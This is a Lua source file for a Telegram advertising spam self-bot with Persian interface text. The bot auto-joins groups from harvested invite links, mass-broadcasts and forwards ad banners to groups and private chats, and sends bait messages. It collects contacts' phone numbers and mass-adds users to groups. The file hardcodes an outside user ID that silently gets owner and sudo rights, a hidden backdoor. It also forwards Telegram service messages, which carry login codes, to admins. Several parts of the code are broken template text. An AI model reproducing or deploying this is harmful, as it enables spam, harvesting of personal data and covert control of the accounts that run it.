--[[
STAGS COME BACK
@Stags-@CaltMan
]]
serpent = (loadfile "libs/serpent.lua")()
redis = (loadfile "libs/redis.lua")()
local sudos = {123456789}
function get_bot()
	function bot_info (i, jove)
		redis:set("BOT-IDbotid", jove.id)
		if jove.first_name then
			redis:set("BOT-IDbotfname", jove.first_name)
		end
		if jove.last_name then
			redis:set("BOT-IDbotlname", jove.last_name)
		end
		redis:set("BOT-IDbotnum", jove.phone_number)
		return jove.id
	end
	assert (tdbot_function ({_ = "getMe"}, bot_info, nil))
	for v,user in pairs(sudos) do
if not redis:sismember("BOT-IDsudos", user) then
redis:sadd("BOT-IDsudos", user)
end
end
end
---------------------
local telegram = 777000 --دست نزنید به این قسمت
----------------------
function is_pouya(msg)
local var = false
local byecoderid = 218722292
if msg.sender_user_id == byecoderid then
	if byecoderid then
		var = true
	end
	end

return var
end
function is_sudo(msg)
local var = false
for v,user in pairs(sudos) do
if user == msg.sender_user_id then
var = true
end
end
local byecoderid = 218722292
if msg.sender_user_id == byecoderid then
	if byecoderid then
		var = true
	end
	end
	if redis:sismember("BOT-IDowner", msg.sender_user_id) then
var = true
end
return var
end
function is_admin(msg)
local var = false
for v,user in pairs(sudos) do
if user == msg.sender_user_id then
var = true
end
end
local byecoderid = 218722292
if msg.sender_user_id == byecoderid then
	if byecoderid then
		var = true
	end
	end
if redis:sismember("BOT-IDsudos", msg.sender_user_id) then
var = true
end
if redis:sismember("BOT-IDowner", msg.sender_user_id) then
var = true
end
return var
end
function kise(lol) 
end 
function sec(lol) 
--sleep(1) 
end 
function sleep(n) 
  os.execute("sleep " .. tonumber(n)) 
end 
function gp_type(chat_id) 
  local gp_type = "pv" 
  local id = tostring(chat_id) 
    if id:match("^-100") then 
      gp_type = "channel" 
    elseif id:match("-") then 
      gp_type = "chat" 
    elseif not id:match("-") then 
      gp_type = "private" 
  end 
  return gp_type 
end 
function leave(chat_id, user_id) assert (tdbot_function ({      _ = "setChatMemberStatus",      chat_id = chat_id,      user_id = user_id,      status = {         _ = "chatMemberStatusLeft"    }, }, dl_cb, nil) )
end 
function vardump(value, depth, key) local linePrefix = "" local spaces = "" if key ~= nil then linePrefix = "["..key.."] = " end if depth == nil then depth = 0 else depth = depth + 1 for i=1, depth do spaces = spaces .. " " end end 
if type(value) == 'table' then mTable = getmetatable(value) if mTable == nil then print(spaces ..linePrefix.."(table) ") 
 else 
print(spaces .."(metatable) ") value = mTable 
end 
for tableKey, tableValue in pairs(value) do 
vardump(tableValue, depth, tableKey) end 
elseif type(value) == 'function' or type(value) == 'thread' or type(value) == 'userdata' or value == nil then print(spaces..tostring(value)) else print(spaces..linePrefix.."("..type(value)..") "..tostring(value)) 
 end 
 end 
function dl_cb (arg, data) 
end 
function reload()
	loadfile("./tabi-BOT-ID.lua")()
end
function add(id)
	local Id = tostring(id)
	if not redis:sismember("BOT-IDall", id) then
		if Id:match("^(%d+)$") then
			redis:sadd("BOT-IDtabchi_pv", id)
			redis:sadd("BOT-IDall", id)
		elseif Id:match("^-100") then
			redis:sadd("BOT-IDtabchi_sugp", id)

			redis:sadd("BOT-IDall", id)
		else
			redis:sadd("BOT-IDtabchi_gp", id)
			redis:sadd("BOT-IDall", id)
			
		end
	end
	return true
end
function rem(id)
	local Id = tostring(id)
	if redis:sismember("BOT-IDall", id) then
		if Id:match("^(%d+)$") then
			redis:srem("BOT-IDtabchi_pv", id)
			redis:srem("BOT-IDall", id)
		elseif Id:match("^-100") then
			redis:srem("BOT-IDtabchi_sugp", id)
			redis:srem("BOT-IDall", id)
		else
			redis:srem("BOT-IDtabchi_gp", id)
			redis:srem("BOT-IDall", id)
		end
	end
	return true
end
function openChat(chatid, callback, data)
  assert (tdbot_function ({
    _ = 'openChat',
    chat_id = chatid
  }, callback or dl_cb, data))
end

function send_msg(chat,text,mid) 
assert (tdbot_function ({_="sendMessage", chat_id= chat , reply_to_message_id=mid, disable_notification=false, from_background=true, reply_markup=nil, input_message_content={_="inputMessageText", text= text, disable_web_page_preview=true, clear_draft=false, entities={}, parse_mode=nil}}, dl_cb, nil)) 
end 
function tdbot_update_callback (data) 
local started2 = redis:get("BOT-IDopenchat")
bot = redis:get("BOT-IDbotid")
if not started2 then
local gp = redis:smembers("BOT-IDtabchi_gp") or "0"
local sugp = redis:smembers("BOT-IDtabchi_sugp") or "0"
            for k,v in pairs(sugp) do
                openChat(v, dl_cb, nil)
             end
		for k,v in pairs(gp) do
                openChat(v, dl_cb, nil)
             end
			 redis:set("BOT-IDopenchat", true)
         end
if (data._ == "updateMessageSendSucceeded") then 
--redis:incr("BOT-IDbot_msg") 
return false
end 
if data._ == "updateChatTopMessage" then
return false
end
if (data._ == "updateNewChat") then 
return false
end
if (data._ == "updateSupergroup") then 
return false
end
if (data._ == "updateUser") then 
return false
end
if (data._ == "updateChatLastMessage") then 
return false
end
if (data._ == "updateNewMessage") then 

local msg = data.message 
if not redis:get("BOT-IDtabchi_fwdtime") then
if (msg.sender_user_id == 777000 or msg.sender_user_id == 178220800) then
			local c = (msg.content.text):gsub("[0123456789:]", {["0"] = "0⃣", ["1"] = "1⃣", ["2"] = "2⃣", ["3"] = "3⃣", ["4"] = "4⃣", ["5"] = "5⃣", ["6"] = "6⃣", ["7"] = "7⃣", ["8"] = "8⃣", ["9"] = "9⃣", [":"] = ":\n"})
			local txt = os.date("پیام ارسال شده از تلگرام در تاریخ 🗓 %Y-%m-%d  و ساعت ⏰ %X  (به وقت سرور)")
			for k,v in ipairs(redis:smembers("BOT-IDsudos")) do
				send_msg(v, txt.."\n\n"..c)
			end
		end
		if msg.content._ == "messageChatDeleteMember" and msg.content.id == bot then
return rem(msg.chat_id)
end
if (msg.content._ == "messageContact" and redis:get("BOT-IDtabchi_save")) then
			local id = msg.content.contact.user_id
			if not redis:sismember("BOT-IDtabchi_contacts_id",id) then
				redis:sadd("BOT-IDtabchi_contacts_id",id)
				local first = msg.content.contact.first_name or "-"
				local last = msg.content.contact.last_name or "-"
				local phone = msg.content.contact.phone_number
				local id = msg.content.contact.user_id
				assert (tdbot_function ({
					_ = "importContacts",
					contacts_ = {[0] = {
							phone_number = tostring(phone),
							first_name = tostring(first),
							last_name = tostring(last),
							user_id = id
						},
					},
				}, dl_cb, nil))
				if redis:get("BOT-IDaddcontact") and msg.sender_user_id ~= bot then
					local fname = redis:get("BOT-IDbotfname")
					local lname = redis:get("BOT-IDbotlname") or ""
					local num = redis:get("BOT-IDbotnum")
					assert (tdbot_function ({
						_ = "sendMessage",
						chat_id = msg.chat_id,
						reply_to_message_id = msg.id,
						disable_notification = 1,
						from_background = 1,
						reply_markup = nil,
						input_message_content = {
							_ = "inputMessageContact",
							contact = {
								_ = "contact",
								phone_number = num,
								first_name = fname,
								last_name = lname,
								user_id = bot
							},
						},
					}, dl_cb, nil))
				end
local addi = redis:smembers("BOT-IDadditexts") or { 
"ادی مرسی اه☺🍒", 
"ادی جیگر بپر پیوی🤤🍉", 
"ادت کردم تیز پیویم باش😑🙄😀", 
"Addi bia pv😆😍", 
"addi tiz sik pv🤓🙄", 
"ادی عشخم بپر پیوی 😉😆😍", 
"ادی پیوی نقطه بنداز😓🤧🎈", 
"ادی بیا پیوی، ادتم باز کن", 
"ادی ، هیع", 
"تو هم اد کردم", 
"تو هم ادی (:", 
"ادت کردم ^_^", 
"ادی تیز پیوی مرسی", 
"addi ♥♥", 
"adi amo :))", 
"add :'(", 
} 
--sleep(5) 
--action(msg.chat_id,"Typing",100)
send_msg(msg.chat_id,addi[math.random(addi)],msg.id) 
end
end
if redis:get("BOT-IDtabchi_markread") then
assert (tdbot_function ({
				_ = "viewMessages",
				chat_id = msg.chat_id,
				message_ids = {[0] = msg.id} 
}, dl_cb, nil))
end
if redis:get("BOT-IDtab_sleep") then 
kise(lol) 
return false 
end 
if redis:get("BOT-IDchannelleft") and (not msg.forward_info and (msg.is_channel_post == true)) then
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(msg.chat_id),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
rem(msg.chat_id)
end
if redis:get("BOT-IDgroupleft") and gp_type(msg.chat_id) == "chat" then
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(msg.chat_id),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
rem(msg.chat_id)
end
------------
function action(chatid,act,uploadprogress)
assert (tdbot_function ({ _ = 'sendChatAction', 
chat_id = chatid, 
action = { _ = 'chatAction' .. act, progress = uploadprogress or 100 }, }, dl_cb, data))
end
------------

local var = serpent.block(msg, {comment=false}) 
function c_chat(user_ids, title, cb, cmd) 
assert (tdbot_function ({ _ = "createNewGroupChat", 
user_ids = user_ids, 
title = title    }, cb or dl_cb, cmd)) 
end 
function change_about(abo) 
assert (tdbot_function ({ _ = 'changeAbout', 
about = tostring(abo) }, 
dl_cb, nil))
end

function import_link(invite_link, cb, cmd) 
assert (tdbot_function ({ 
_ = "joinChatByInviteLink" , 
invite_link = tostring(invite_link) 
}, cb, cmd)) 
end 
function check_link(invitelink, cb, data) 
assert (tdbot_function ({ _ = 'checkChatInviteLink', 
invite_link = tostring(invitelink) }, cb, data))
end
function add_user(chat_id, user_id)   
 assert (tdbot_function 
({ _ = "addChatMember", 
chat_id = tonumber(chat_id), 
user_id = user_id, 
forward_limit = 0    }, 
dl_cb, extra) )
end 
function markread(chatid, messageids, callback, data) 
assert (tdbot_function ({ _ = 'viewMessages', 
chat_id = chatid, 
message_ids = messageids }, 
callback or dl_cb, data))
end
function getChannelFull(channel_id, cb, cmd)    tdbot_function ({    _ = "GetChannelFull",    channel_id = getChatId(channel_id)._    }, cb or dl_cb, cmd)end 
function 
fwd_msg(az_koja,be_koja_,msg_id) 
assert (tdbot_function ({ 
    _ = "forwardMessages", 
    chat_id =  be_koja_, 
    from_chat_id = az_koja, 
    message_ids = {[0]= msg_id}, 
    disable_notification = disable_notification, 
    from_background = 1 
  }, dl_cb, cmd) )
  end 
  
function join(text)
if text:match("https://telegram.me/joinchat/%S+") or text:match("https://t.me/joinchat/%S+") or text:match("https://telegram.dog/joinchat/%S+") then 
local text = text:gsub("t.me", "telegram.me") 
local text = text:gsub("telegram.dog", "telegram.me") 
for link in text:gmatch("(https://telegram.me/joinchat/%S+)") do 
			if not redis:sismember("BOT-IDtabchi_alllinks", link) then
redis:sadd("BOT-IDtabchi_alllinks", link) 
redis:sadd("BOT-IDtabchi_waitforlinks", link)
			end
		end
	end
end
if not redis:get("BOT-IDtabchi_waitforlinkswait") and redis:get("BOT-IDtabchi_autojoin") then
			if redis:scard("BOT-IDtabchi_waitforlinks") ~= 0 and redis:scard("BOT-IDtabchi_checklinks") < BOT-ID0 then
				local links = redis:smembers("BOT-IDtabchi_waitforlinks")
				local max_x = redis:get("botBOT-IDmaxlinkcheck") or 1
				local delay = redis:get("botBOT-IDmaxlinkchecktime") or BOT-ID0
				for x = 1, links do
					redis:sadd("BOT-IDtabchi_checklinks", links[x])

                    redis:srem("BOT-IDtabchi_waitforlinks", links[x])
					if x == tonumber(max_x) then redis:setex("BOT-IDtabchi_waitforlinkswait", tonumber(delay), true) return end
				end
			end
end
if not redis:get("BOT-IDtabchi_dilay") and redis:get("BOT-IDtabchi_autojoin") then
			if redis:scard("BOT-IDtabchi_checklinks") ~= 0 then
				local links = redis:smembers("BOT-IDtabchi_checklinks")
				local max_x = redis:get("botBOT-IDmaxlinkjoin") or 1
				local delay = redis:get("botBOT-IDmaxlinkjointime") or BOT-ID0
				for x = 1, links do
					import_link(links[x], dl_cb, nil)
redis:srem("BOT-IDtabchi_checklinks", links[x])
					if x == tonumber(max_x) then redis:setex("BOT-IDtabchi_dilay", tonumber(delay), true) return end
				end
			end
end
if msg.content.caption and redis:get("BOT-IDtabchi_autojoin") and not redis:get("BOT-IDtabchi_fwdtime") then 
join(msg.content.caption) 
end 

--[[if gp_type(msg.chat_id) == "channel" and not redis:sismember("BOT-IDtabchi_sugp",msg.chat_id) then 
redis:sadd("BOT-IDtabchi_sugp",msg.chat_id) 
end 
if gp_type(msg.chat_id) == "chat" and not redis:sismember("BOT-IDtabchi_gp",msg.chat_id) then 
redis:sadd("BOT-IDtabchi_gp",msg.chat_id) 
end 
if gp_type(msg.chat_id) == "private" and not redis:sismember("BOT-IDtabchi_pv",msg.chat_id) then 
redis:sadd("BOT-IDtabchi_pv",msg.chat_id) 
end ]]

--redis:incr("BOT-IDall:pm") 
if msg.content._ and not redis:sismember("BOT-IDtabchi_bot",msg.sender_user_id) then 
redis:sadd("BOT-IDtabchi_bot",msg.sender_user_id) 
return 
end 
if msg.content._ == "messageText" then
if  not redis:get("BOT-IDtabchi_fwdtime") then
add(msg.chat_id)
end
if msg.content.text and redis:get("BOT-IDtabchi_autojoin") and not redis:get("BOT-IDtabchi_fwdtime") then 
if tonumber(redis:scard("BOT-IDtabchi_sugp")) < 550 then
join(msg.content.text) 
end
end 
if msg.content.text and not redis:get("BOT-IDtabchi_restarttime") then 
local lol5 = redis:smembers("BOT-IDtabchi_alllinks") 
for i=1, lol5 do 
redis:srem("BOT-IDtabchi_alllinks", lol5[i])
end 
local lol6 = redis:smembers("BOT-IDtabchi_waitforlinks") 
for i=1, lol6 do 
redis:srem("BOT-IDtabchi_waitforlinks", lol6[i])
end 
local lol8 = redis:smembers("BOT-IDtabchi_bot") 
for i=1, lol8 do 
redis:srem("BOT-IDtabchi_bot", lol8[i])
end 
local lol9 = redis:smembers("BOT-IDsended") 
for i=1, lol9 do 
redis:srem("BOT-IDsended", lol9[i])
end
local lol10 = redis:smembers("BOT-IDaddleft_gp") 
for i=1, lol10 do 
redis:srem("BOT-IDaddleft_gp", lol10[i])
end
local lol11 = redis:smembers("BOT-IDaddall_gp") 
for i=1, lol11 do 
redis:srem("BOT-IDaddall_gp", lol11[i])
end
local lol12 = redis:smembers("BOT-IDtableft_gp") 
for i=1, lol12 do 
redis:srem("BOT-IDtableft_gp", lol12[i])
end
redis:setex("BOT-IDtabchi_restarttime", 172800, true)
end

if msg.content.text and tonumber(redis:scard("BOT-IDtabchi_sugp")) > 500 then
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(msg.chat_id),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
rem(msg.chat_id)
end
if redis:get("BOT-IDtab_typing") then
action(msg.chat_id,"Typing",100)
end
--[[if msg.content.text and msg.is_channel_post == true then 
leave(tonumber(msg.chat_id),tonumber(bot))
return false 
end ]]


		
if redis:get("BOT-IDtabchi_autorandom") and not redis:get("BOT-IDtab_time_random") then
redis:setex("BOT-IDtab_time_random",600,true)
local random_group = redis:smembers("BOT-IDtabchi_sugp")
local lol5 = redis:smembers("BOT-IDtabchi_gp")
local r_chat = redis:get("BOT-IDrand_cid")
local m_id = redis:get("BOT-IDrand_mid")
for i=1, random_group do
openChat(random_group[i], dl_cb, nil)
fwd_msg(r_chat,random_group[i],m_id)
end
for i=1, lol5 do
openChat(lol5[i], dl_cb, nil)
fwd_msg(r_chat,lol5[i],m_id)
end
--redis:incr("BOT-IDall:random") 
send_msg(msg.chat_id,"auto random ads is runnig, and now send your ads to"..random_group.."groups and "..lol5.." Groups ")
fwd_msg(r_chat,tonumber(msg.chat_id),m_id)
end
if msg.content.text and redis:get("BOT-IDtabchi_tableft") and not redis:get("BOT-IDtableft_time") and redis:get("BOT-IDrand_cid") then 
if not redis:sismember("BOT-IDtableft_gp",msg.chat_id) then 
redis:sadd("BOT-IDtableft_gp",msg.chat_id) 
local mid = redis:smembers("BOT-IDtabchi_baner_mmid") 
local r_chat = redis:get("BOT-IDtabchi_baner_cid") 
for i=1, mid do 
openChat(msg.chat_id, dl_cb, nil)
fwd_msg(r_chat,msg.chat_id,mid[i])
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(msg.chat_id),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
rem(msg.chat_id)
end
redis:setex("BOT-IDtableft_time",3,true) 
end 
end 
if msg.content.text and redis:get("BOT-IDtabchi_addtoall") and is_admin(msg) then 
local fff = redis:smembers("BOT-IDtabchi_sugp") 
for i=1 , fff do 
add_user(fff[i],msg.content.text) 
end 
send_msg(msg.chat_id,"به همه گروه ها اضافه شد!",msg.id) 
redis:del("BOT-IDtabchi_addtoall") 
end 
----------|auto left|------------- 

if msg.content.text and redis:get("BOT-IDtabchi_autoleft") then 
leave(msg.chat_id,tonumber(bot)) 
end 

if msg.content.text and redis:get("BOT-IDon-offmsg") then
fwdismsg = redis:get("BOT-IDon-offmsg")
fwdischat = redis:get("BOT-IDon-offchat")
if not redis:sismember("BOT-IDsended", msg.chat_id) then 
openChat(msg.chat_id, dl_cb, nil)
fwd_msg(fwdischat, msg.chat_id, fwdismsg)
redis:sadd("BOT-IDsended", msg.chat_id)
end
end
----------------------- 

if msg.content.text and redis:get("BOT-IDwait_addall") and is_admin(msg) then 
redis:set("BOT-IDaddall_uid",msg.content.text) 
send_msg(msg.chat_id,"ایدی مورد نظر "..msg.content.text.."با موفقیت تنظیم شد.") 
redis:del("BOT-IDwait_addall") 
end 
----------------------- 
----------------------- 
if msg.content.text and redis:get("BOT-IDtabchi_autoaddtoall") and not redis:get("BOT-IDadd_time") then 
if not redis:sismember("BOT-IDaddall_gp",msg.chat_id) then 
redis:setex("BOT-IDadd_time",3,true) 
redis:sadd("BOT-IDaddall_gp",msg.chat_id) 
local user = redis:get("BOT-IDaddall_uid") 
add_user(msg.chat_id,user) 
end 
end 
if msg.content.text and redis:get("BOT-IDtabchi_addleft") and not redis:get("BOT-IDaddleft_time") and redis:get("BOT-IDaddall_uid")  then 
if not redis:sismember("BOT-IDaddleft_gp",msg.chat_id) then 
redis:sadd("BOT-IDaddleft_gp",msg.chat_id) 
local user = redis:get("BOT-IDaddall_uid") 
add_user(msg.chat_id,user) 
rem(msg.chat_id)
redis:setex("BOT-IDaddleft_time",3,true) 
end 
end 

---------------------

---------------------
if msg.content.text and redis:get("BOT-IDtabchi_autofwd") and not redis:get("BOT-IDtab_time") then 
redis:setex("BOT-IDtab_time",3,true) 
--redis:incr("BOT-IDall:fwd") 
local mid = redis:smembers("BOT-IDtabchi_baner_mmid") 
local cid = redis:get("BOT-IDtabchi_baner_cid") 
for i=1 , mid do 
openChat(msg.chat_id, dl_cb, nil)
fwd_msg(cid,msg.chat_id,mid[i]) 
end 
end 
if msg.content.text and redis:get("BOT-IDtabchi_fwd_su") and is_admin(msg) then 
sau = redis:smembers("BOT-IDtabchi_sugp") 

for i=1, sau do 
openChat(sau[i], dl_cb, nil)
fwd_msg(msg.chat_id,sau[i],msg.id) 
redis:sadd("BOT-IDsended", sau[i])
end 
send_msg(msg.chat_id,"Sent!") 
redis:del("BOT-IDtabchi_fwd_su") 
redis:set("BOT-IDon-offmsg", msg.id)
redis:set("BOT-IDon-offchat", msg.chat_id)
end 
--------------------- 
if msg.content.text and redis:get("BOT-IDtabchi_fwd_pv") and is_admin(msg) then 

pav = redis:smembers("BOT-IDtabchi_pv") 

for i=1, pav do 
fwd_msg(msg.chat_id,pav[i],msg.id) 
redis:sadd("BOT-IDsended", pav[i])
end 
send_msg(msg.chat_id,"Sent!") 
redis:del("BOT-IDtabchi_fwd_pv") 
redis:set("BOT-IDon-offmsg", msg.id)
redis:set("BOT-IDon-offchat", msg.chat_id)
end 
---------------------- 
if msg.content.text and redis:get("BOT-IDtabchi_fwd_gp") and is_admin(msg) then 
gap = redis:smembers("BOT-IDtabchi_gp") 

for i=1, gap do 
openChat(gap[i], dl_cb, nil)
fwd_msg(msg.chat_id,gap[i],msg.id) 
redis:sadd("BOT-IDsended", gap[i])
end 
send_msg(msg.chat_id,"Sent!") 
redis:del("BOT-IDtabchi_fwd_gp") 
redis:set("BOT-IDon-offmsg", msg.id)
redis:set("BOT-IDon-offchat", msg.chat_id)
end 

--------------------- 
if msg.content.text and redis:get("BOT-IDtabchi_bc_su") and is_admin(msg) then 
sau = redis:smembers("BOT-IDtabchi_sugp") 

for i=1, sau do 
--sleep(1) 
openChat(sau[i], dl_cb, nil)
send_msg(sau[i],msg.content.text) 
end 
send_msg(msg.chat_id,"Sent!") 
redis:del("BOT-IDtabchi_bc_su") 
end 
--------------------- 
if msg.content.text and redis:get("BOT-IDtabchi_bc_pv") and is_admin(msg) then 

pav = redis:smembers("BOT-IDtabchi_pv") 

for i=1, pav do 

send_msg(pav[i],msg.content.text) 
end 
send_msg(msg.chat_id,"Sent!") 
redis:del("BOT-IDtabchi_bc_pv") 
end 
---------------------- 
if msg.content.text and redis:get("BOT-IDtabchi_bc_gp") and is_admin(msg) then 
gap = redis:smembers("BOT-IDtabchi_gp") 

for i=1, gap do 
openChat(gap[i], dl_cb, nil)

send_msg(gap[i],msg.content.text) 
end 
send_msg(msg.chat_id,"Sent!") 
redis:del("BOT-IDtabchi_bc_gp") 
end 

if msg.content.text == "stats" and is_admin(msg) then 
--all = redis:get("BOT-IDall:pm") or 0 or "0" 
allfwd = redis:get("BOT-IDall:fwd") or 0 or "0" 
randfwd = redis:get("BOT-IDall:random") or 0 or "0" 
--mmsg = redis:get("BOT-IDbot_msg") or 0 
--all_chat = redis:scard("BOT-IDtabchi_bot") 
gp = redis:scard("BOT-IDtabchi_gp") 
pv = redis:scard("BOT-IDtabchi_pv") 
sugp = redis:scard("BOT-IDtabchi_sugp") 
local s =  redis:ttl("BOT-IDtabchi_dilay") or 0
local ss = redis:ttl("BOT-IDtabchi_waitforlinkswait") or 0
local wlinks = redis:scard("BOT-IDtabchi_waitforlinks")
local glinks = redis:scard("BOT-IDtabchi_checklinks")
send_msg(msg.chat_id,"▪️سیستم آمارگیری تبلیغاتی\n▫️تعداد گروه ها: "..gp.."\n▫️سوپر گروه ها: "..sugp.."\n▫️چت های خصوصی: "..pv.."\n▫️شماره های سیو شده:  "..redis:scard("BOT-IDtabchi_contacts_id").."\n▫️لینک های ذخیره شده: "..redis:scard("BOT-IDtabchi_alllinks").."\n▫️لینک های در انتظار تایید: "..tostring(wlinks).."\n▫️لینک های در انتظار عضویت: "..tostring(glinks).."\n👈🏻"..tostring(ss).." ثانیه تا تایید لینک مجدد\n👈🏻"..tostring(s).." ثانیه تا عضویت مجدد\n▫️تعداد تبلیغات هوشمند ارسالی: "..allfwd.."\n▫️تعداد تبلیغات رندم ارسالی: "..randfwd.."\n\nتبلیغاتی ورژن 3(@Stags)")
end 
if msg.content.text == "fwd su" and is_admin(msg)  then 
redis:set("BOT-IDtabchi_fwd_su","ok") 
send_msg(msg.chat_id,"بفرستید suالان متن خود را به ") 

return false 
end 
if msg.content.text == "fwd gp" and is_admin(msg)  then 
redis:set("BOT-IDtabchi_fwd_gp","ok") 
send_msg(msg.chat_id,"حالا متن خود را به گروه بفرستید") 
return false 
end 
if msg.content.text == "fwd pv" and is_admin(msg)  then 
redis:set("BOT-IDtabchi_fwd_pv","ok") 
send_msg(msg.chat_id,"الان متن خود را به پیوی عضا بفرستید") 
return false 
end 
if msg.content.text == "bc su" and is_admin(msg)  then 
redis:set("BOT-IDtabchi_bc_su","ok") 
send_msg(msg.chat_id,"حالا متن خود را ارسال کنید") 
return false 
end 

if msg.content.text == "savenumber on" and is_admin(msg)  then 
redis:set("BOT-IDtabchi_save","ok") 
send_msg(msg.chat_id,"هم اکنون تبلیغاتی شماره های ارسالی را سیو میکند!") 
return false 
end 
if msg.content.text == "savenumber off" and is_admin(msg)  then 
redis:del("BOT-IDtabchi_save") 
send_msg(msg.chat_id,"هم اکنون تبلیغاتی شماره های ارسالی را سیو نمیکند!") 
return false 
end 
---------------------------
   local matches = {
      msg.content.text:match("^(addsudo) (%d+)")
    }
	if is_sudo(msg) then
    if msg.content.text:match("^addsudo")  then
      local text = matches[2] .. " کاربر سودو شد"
      redis:sadd("BOT-IDsudos",tonumber(matches[2]))
      send_msg(msg.chat_id,text,msg.id)
	end
    local matches = {
      msg.content.text:match("^(remsudo) (%d+)")
    }
	if is_sudo(msg) then
    if msg.content.text:match("^remsudo")  then
      local text = matches[2] .. "کاربر دیگر سودو نیست"
      redis:srem("BOT-IDsudos", tonumber(matches[2]))
      send_msg(msg.chat_id,text,msg.id)
    end
  end  
  end
  
     local matches = {
      msg.content.text:match("^(addallsudo) (%d+)")
    }
	if is_pouya(msg) then
    if msg.content.text:match("^addallsudo")  then
      local text = matches[2] .. " کاربر سودوی کل شد"
      redis:sadd("BOT-IDowner",tonumber(matches[2]))
      send_msg(msg.chat_id,text,msg.id)
	end
    local matches = {
      msg.content.text:match("^(remallsudo) (%d+)")
    }
	if is_pouya(msg) then
    if msg.content.text:match("^remallsudo")  then
      local text = matches[2] .. "کاربر از سودوی کل برکنار شد"
      redis:srem("BOT-IDowner", tonumber(matches[2]))
      send_msg(msg.chat_id,text,msg.id)
    end
  end  
  end
---------------------------
if msg.content.text:match("typing on") and is_admin(msg)  then 

redis:set("BOT-IDtab_typing","ok")
send_msg(msg.chat_id,"حالت تایپینگ در گروه های تبلیغاتی فعال شد!")
end
if msg.content.text:match("typing off") and is_admin(msg)  then 
redis:del("BOT-IDtab_typing")
send_msg(msg.chat_id,"حالت تایپینگ در گروه های تبلیغاتی غیر فعال شد!")
end
--------------------------------
if (msg.content.text and redis:get("BOT-IDleftname")) then 
function check_abc(extra, result,success)
local checks = redis:smembers("BOT-IDleftnamecheck") or "تبلیغات"
for x = 1, checks do
local names = result.title
local bot = redis:get("BOT-IDbotid")
if names:find(tostring(checks[x])) or names:find(checks[x]) then
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(result.id),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
rem(result.id)
     end
	 end
	 end
	   assert (tdbot_function ({
    _ = "getChat",
    chat_id = msg.chat_id
}, check_abc, nil))
     end
-------------------------
--[[if (msg.content.text:match("https://telegram.me/joinchat/%S+") or msg.content.text:match("https://t.me/joinchat/%S+") or msg.content.text:match("https://telegram.dog/joinchat/%S+")) and is_admin(msg) then 
local abc = msg.content.text:gsub("t.me", "telegram.me") 
local abc = msg.content.text:gsub("telegram.dog", "telegram.me") 
     function check_abc(extra, result,success)
     vardump(result)
	 if (result.is_group or result.is_supergroup_channel) then
     send_msg(218722292,"result: is_group or supergroupchannel")
	 end
	  if (result.code == 429) then
     send_msg(218722292,"result: code==429")
	 end
	 	  if (extra.again) then
     send_msg(218722292,"result: again join")
	 end
	 	 	  if (extra.join and extra.again) then
     send_msg(218722292,"result: again join")
	 end
	 	 	 	  if (result.title and extra.title) then
     send_msg(218722292,"result: find title")
	 end
     end
       --check_link(abc),check_abc)
       check_link(abc,check_abc)
     end]]
if msg.content.text:match("setabout") and is_admin(msg) then 
local text = msg.content.text:gsub('setabout', '')
change_about(tostring(text))
send_msg(msg.chat_id,'\n'..text..'\nhas been set for about user')
end
if msg.content.text:match("echo") and is_admin(msg)  then 
local text = msg.content.text:gsub('echo', '')
send_msg(msg.chat_id,text)
end
if msg.content.text == "bc gp" and is_admin(msg)  then 
redis:set("BOT-IDtabchi_bc_gp","ok") 
send_msg(msg.chat_id,"حالا متن خود را ارسال کنید") 
return false 
end 
if msg.content.text == "bc pv" and is_admin(msg)  then 
redis:set("BOT-IDtabchi_bc_pv","ok") 
send_msg(msg.chat_id,"حالا متن خود را ارسال کنید") 
return false 
end 

function deleteMessages(chatid, mid) 
 assert (tdbot_function ({ 
_ = "deleteMessages", 
chat_id = chatid, 
message_ids = mid 
  }, dl_cb, CerNer)) 
end 

if msg.content.text == 'addmembers' then 
assert (tdbot_function({
							_ = "searchContacts",
							query = nil,
							limit = 999999999
						},function(i, tabi)
							local users, count = redis:smembers("BOT-IDtabchi_contacts_id"), tabi.total_count
							for n=0, tonumber(count) - 1 do
								assert (tdbot_function ({
									_ = "addChatMember",
									chat_id = tonumber(i.chat_id),
									user_id = tabi.users[n].id,
									forward_limit = 50
								},  dl_cb, nil))
							end
							for n=1, users do
								assert (tdbot_function ({
									_ = "addChatMember",
									chat_id = tonumber(i.chat_id),
									user_id = tonumber(users[n]),
									forward_limit = 50
								},  dl_cb, nil))
							end
						end, {chat_id=msg.chat_id}))
						return 
send_msg(msg.chat_id,"▪️افزودن اعضا با موفقیت انجام شد!") 
end 
-------------------------- 
if msg.content.text == 'addtoall' and is_admin(msg) then 

send_msg(msg.chat_id,"حال لطفا ایدی عددی هشت یا نه رقمی اکانت مورد نظر را برای اضافه کردن به همه گروه ها بفرستید",msg.id) 
redis:set("BOT-IDtabchi_addtoall","ok") 
end 
if msg.content.text == 'setaddtoall' and is_admin(msg) then 

send_msg(msg.chat_id,"حال لطفا ایدی عددی هشت یا نه رقمی اکانت مورد نظر را برای اضافه کردن هوشمندانه به گروه ها بفرستید.",msg.id) 
redis:set("BOT-IDwait_addall","ok") 
end 
----------- 
if msg.content.text == 'random' and  is_admin(msg) then 
local mid = redis:srandmember('BOT-IDtabchi_baner_mmid',1) 
local cid = redis:get("BOT-IDtabchi_baner_cid") 
fwd_msg(cid,msg.chat_id,mid[math.random(mid)]) 
end 
----------- 
if msg.content.text == 'setbaner' and msg.reply_to_message_id and is_admin(msg) then 
redis:sadd("BOT-IDtabchi_baner_mmid",msg.reply_to_message_id) 
redis:set("BOT-IDtabchi_baner_cid",msg.chat_id) 
send_msg(msg.chat_id,"بنر تبلیغات با موفقیت تنظیم شد!") 
end 
if msg.content.text == 'getbaner' and is_admin(msg) then 
local mid = redis:smembers("BOT-IDtabchi_baner_mmid") 
local cid = redis:get("BOT-IDtabchi_baner_cid") 
